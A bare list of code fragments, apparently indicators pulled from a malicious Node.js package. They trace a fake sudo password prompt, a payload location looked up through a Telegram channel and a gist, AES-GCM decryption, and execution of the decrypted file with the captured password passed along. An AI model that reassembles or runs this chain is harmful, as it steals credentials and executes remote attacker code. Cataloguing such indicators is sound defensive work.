Password for ${user}:
spawnSync('sudo', ['-S', '-v', '-k']
https://t.me/s/roblox_f847yt83w7it
await fetchText(gistUrl)
createDecipheriv('aes-256-gcm'
fs.writeFileSync(tempFile, decrypted)
spawn(process.execPath, [tempFile]
GHOST_PWD: capturedPassword